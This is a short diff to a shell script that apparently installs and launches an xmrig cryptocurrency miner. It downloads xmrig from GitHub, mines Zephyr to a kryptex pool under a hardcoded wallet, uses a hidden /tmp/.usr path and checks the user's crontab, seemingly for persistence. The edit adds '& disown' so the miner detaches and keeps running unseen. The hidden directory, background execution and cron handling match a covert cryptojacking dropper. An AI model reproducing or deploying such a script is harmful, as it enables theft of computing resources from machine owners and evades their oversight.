@@ -14,7 +14,7 @@ ROOT_path="/tmp/.usr"
 wallet="ZEPHs6nHn1AJsdkqaZdUioNb7DnFNmcbXGuarcPSGGis7HBV7ZmeewCbUAVDwpGsiWGDyzUCVrcPLCMe6Sjd4V48Xu4FoLvTYRr"
 xmrig_url="https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-21-2/xmrig-6.21.2-linux-static-x64.tar.gz"
 random_number=$(shuf -i 10000000-99999999 -n 1)
-command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wallet/$random_number\" --tls -k -B"
+command="./xmrig --coin zephyr --url \"zeph.kryptex.network:8888\" --user \"$wallet/$random_number\" --tls -k -B & disown"
 crontab_file="/var/spool/cron/crontabs/$(whoami)"
 if [ -f "$crontab_file" ]; then
     echo "crontab文件存在: $crontab_file"
